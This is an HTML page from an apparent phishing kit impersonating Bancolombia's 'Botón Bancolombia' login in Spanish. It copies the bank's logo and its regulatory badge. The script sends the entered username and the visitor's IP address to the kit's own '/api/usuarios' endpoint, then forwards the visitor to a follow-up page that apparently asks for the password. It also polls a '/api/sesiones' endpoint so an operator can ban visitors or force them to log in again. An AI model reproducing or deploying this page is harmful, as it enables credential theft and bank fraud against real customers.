<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Botón Bancolombia</title>
  <link rel="icon" type="image/png" href="icon-tab.webp">
  <script>
    if (localStorage.getItem('forceRelogin') === '1') {
      localStorage.removeItem('forceRelogin');
    }
  </script>
  <style>
    .sr-only { position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0; }
    .error-msg { color:#d32f2f;font-size:15px;margin-bottom:10px;min-height:18px;text-align:left; }
    html { -webkit-text-size-adjust:100%; }
    :root { --yellow:#ffd100;--black:#111;--gray:#666;--border:#e6e6e6; }
    * { margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;font-weight:400; }

    body { min-height:100vh;display:flex;flex-direction:column;background:#f4f5f6;color:var(--black); }

    header {
      background:#fff;padding:16px 20px;
      display:grid;grid-template-columns:1fr auto 1fr;
      align-items:center;border-bottom:1px solid var(--border);
    }
    .header-exit { justify-self:end;font-size:15px;color:#333;text-decoration:none; }
    .logoban { max-width:200px;justify-self:center; }

    main {
      flex:1;max-width:640px;width:100%;
      margin:0 auto;padding:0 16px;text-align:center;
      /* Sin padding-bottom para que la onda quede pegada */
      padding-bottom: 0;
    }
    h1 { font-size:clamp(22px,5vw,28px);font-weight:700;margin:32px 0 24px; }

    .card {
      background:#fff;border-radius:24px;
      padding:36px 44px;
      box-shadow:0 4px 24px rgba(0,0,0,.09);
      position: relative;
      z-index: 1;
    }
    .info-text { font-size:16px;line-height:1.6;color:#333;margin-bottom:32px; }
    .info-text span { display:block;font-weight:600; }

    .input-group { display:flex;align-items:center;gap:14px;border-bottom:1px solid #bbb;padding-bottom:10px;margin-bottom:12px; }
    .input-group svg { width:24px;height:24px;color:#666;flex-shrink:0; }
    input { border:none;outline:none;width:100%;font-size:17px;background:transparent;color:#111; }
    .forgot { display:block;text-align:right;font-size:14px;color:#444;text-decoration:none;margin-bottom:28px; }

    .buttons { display:flex;gap:16px; }
    .btn { flex:1;padding:16px;border-radius:999px;font-size:17px;font-weight:500;cursor:pointer;border:2px solid var(--black);background:transparent;color:#111;-webkit-text-fill-color:#111; }
    .btn.primary { background:var(--yellow);border-color:var(--yellow);color:#000;font-weight:700; }

    /* Ondas pegadas al borde inferior de la card */
    .ondas-wrap {
      max-width: 640px;
      width: 100%;
      margin: 0 auto;
      margin-top: -30px; /* sube la imagen para que quede detrás del borde inferior de la card */
      flex-shrink: 0;
      position: relative;
      z-index: 0;
    }
    .ondas-wrap img {
      width: 100%;
      display: block;
    }

    footer {
      background:#fff;text-align:center;
      padding:20px 16px 22px;font-size:12px;
      color:var(--gray);border-top:1px solid var(--border);
    }
    .logo-footer { max-width:160px;margin-bottom:6px; }
    .vigilado-wrap { display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px; }
    .vigilado-badge { border:1.5px solid #333;font-size:8px;font-weight:700;letter-spacing:1px;padding:1px 4px;text-transform:uppercase;color:#333;line-height:1.2; }
    .vigilado-text { font-size:9px;color:#555;text-align:left;line-height:1.3; }

    #loadingOverlay { position:fixed;inset:0;background:rgba(0,0,0,.25);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;z-index:9999; }
    .loading-box { width:220px;height:220px;background:#fff;border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center; }
    .spinner { width:42px;height:42px;border:3px solid #ddd;border-top-color:#111;border-radius:50%;animation:spin 1s linear infinite; }
    .loading-box p { margin-top:14px;font-size:16px; }
    @keyframes spin { to { transform:rotate(360deg); } }

    @media (max-width:520px) {
      .card { padding:28px 18px; }
      h1 { font-size:22px; }
      .ondas-wrap { margin-top: -20px; }
    }
  </style>
</head>
<body>

<header>
  <div></div>
  <img class="logoban" src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES">
  <a class="header-exit" href="Tu-Boleta.html">Salir →</a>
</header>

<main>
  <h1>Te damos la bienvenida</h1>
  <div class="card">
    <p class="info-text">
      El usuario es el mismo con el que ingresas a la
      <span>Sucursal Virtual Personas.</span>
    </p>
    <form id="loginForm">
      <div class="input-group">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
          <circle cx="12" cy="8" r="4"/>
          <path d="M4 21v-1a6 6 0 0 1 6-6h4a6 6 0 0 1 6 6v1"/>
        </svg>
        <label for="usuario" class="sr-only">Usuario</label>
        <input id="usuario" name="usuario" type="text" placeholder="Usuario" required minlength="4" maxlength="30" autocomplete="username">
      </div>
      <div id="errorMsg" class="error-msg" aria-live="polite" style="display:none;"></div>
      <a href="#" class="forgot">¿Olvidaste tu usuario?</a>
      <div class="buttons">
        <button id="btnVolver" type="button" class="btn">Volver</button>
        <button id="btnContinuar" type="submit" class="btn primary">
          <span id="btnText">Continuar</span>
          <span id="btnSpinner" style="display:none;vertical-align:middle;">
            <svg width="18" height="18" viewBox="0 0 50 50">
              <circle cx="25" cy="25" r="20" fill="none" stroke="#111" stroke-width="4" stroke-linecap="round" stroke-dasharray="31.4 31.4" transform="rotate(-90 25 25)">
                <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/>
              </circle>
            </svg>
          </span>
        </button>
      </div>
    </form>
  </div>
</main>

<div class="ondas-wrap">
  <img src="fondo-ondas.png" alt="">
</div>

<footer>
  <img class="logo-footer" src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES">
  <div class="vigilado-wrap">
    <span class="vigilado-badge">VIGILADO</span>
    <span class="vigilado-text">SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</span>
  </div>
  <p id="footerIp">Cargando IP...</p>
  <p id="footerFecha"></p>
</footer>

<div id="loadingOverlay">
  <div class="loading-box">
    <div class="spinner"></div>
    <p>Redireccionando...</p>
  </div>
</div>

<script>
  const overlay = document.getElementById("loadingOverlay");
  const form = document.getElementById("loginForm");
  const btnVolver = document.getElementById("btnVolver");
  const btnContinuar = document.getElementById("btnContinuar");
  const btnText = document.getElementById("btnText");
  const btnSpinner = document.getElementById("btnSpinner");
  const usuarioInput = document.getElementById("usuario");
  const errorMsg = document.getElementById("errorMsg");

  (function() {
    const ip = localStorage.getItem('user_ip');
    if (ip) document.getElementById('footerIp').textContent = 'Dirección IP: ' + ip;
    const now = new Date();
    document.getElementById('footerFecha').textContent = now.toLocaleString('es-CO', {
      weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'2-digit',minute:'2-digit'
    });
  })();

  function showError(msg) { errorMsg.textContent=msg; errorMsg.style.display=msg?"block":"none"; }
  function disableButtons(d) { btnContinuar.disabled=d; btnVolver.disabled=d; }
  function showBtnSpinner(s) { btnSpinner.style.display=s?"inline-block":"none"; btnText.style.display=s?"none":"inline"; }
  function redirectWithLoader(url) { overlay.style.display="flex"; disableButtons(true); setTimeout(()=>{ window.location.href=url; },2000); }

  async function getIp() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      localStorage.setItem('user_ip', data.ip);
      document.getElementById('footerIp').textContent = 'Dirección IP: ' + data.ip;
      return data.ip;
    } catch { return ''; }
  }
  getIp();

  form.addEventListener("submit", async e => {
    e.preventDefault(); showError("");
    const usuario = usuarioInput.value.trim();
    if (!usuario) { showError("Por favor ingresa tu usuario."); usuarioInput.focus(); return; }
    if (usuario.length < 4) { showError("El usuario debe tener al menos 4 caracteres."); usuarioInput.focus(); return; }
    if (!/^[a-zA-Z0-9._-]+$/.test(usuario)) { showError("Solo se permiten letras, números y . _ -"); usuarioInput.focus(); return; }
    showBtnSpinner(true); disableButtons(true);
    let ip = localStorage.getItem('user_ip') || await getIp();
    try {
      await fetch('/api/usuarios', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ usuario, fecha: new Date().toISOString(), ip })
      });
    } catch(e) {}
    redirectWithLoader("Boton-Bancolombia-Clv.html");
  });

  btnVolver.addEventListener("click", () => { showError(""); showBtnSpinner(false); redirectWithLoader("index.html"); });
  usuarioInput.addEventListener("input", () => { showError(""); });

  async function checkSessionStatus() {
    const ip = localStorage.getItem('user_ip');
    if (!ip) return;
    try {
      const res = await fetch('/api/sesiones');
      const sesiones = await res.json();
      const sesion = sesiones[ip];
      if (!sesion) return;
      if (sesion.ban) { window.location.href='https://www.bancolombia.com'; return; }
      if (sesion.relogin) {
        await fetch('/api/relogin', {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ ip })
        });
      }
    } catch {}
  }
  setInterval(checkSessionStatus, 1500);
</script>
</body>
</html>
